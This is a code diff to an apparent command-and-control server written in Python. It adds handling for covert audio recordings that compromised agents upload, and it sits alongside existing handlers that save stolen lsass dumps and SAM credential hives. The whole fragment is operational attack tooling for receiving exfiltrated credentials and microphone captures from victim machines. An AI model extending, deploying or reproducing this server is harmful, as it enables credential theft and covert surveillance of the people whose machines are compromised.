@@ -64,6 +64,13 @@ class C2(BaseHTTPRequestHandler):
                 utils.log_message(f"Downloaded lsass dump from agent {agent}")
                 utils.log_message(f"[+] saved in: {save_path}", print_time=False)
 
+        elif command_type == "audio" and agent_data["data"]["is_success"] == "true":
+            save_path = os.path.join(collect_folder, agent, "record.wav")
+            if utils.write_file(save_path, utils.decode_base_64(agent_data["data"]["file_content_base64"])):
+                utils.log_message(f"Downloaded audio recording from agent {agent}")
+                utils.log_message(f"[+] saved in: {save_path}", print_time=False)
+
+
         elif command_type == "sam" and agent_data["data"]["is_success"] == "true":
             save_path = os.path.join(collect_folder, agent, "sam")
             sam_path = os.path.join(save_path, "sam")
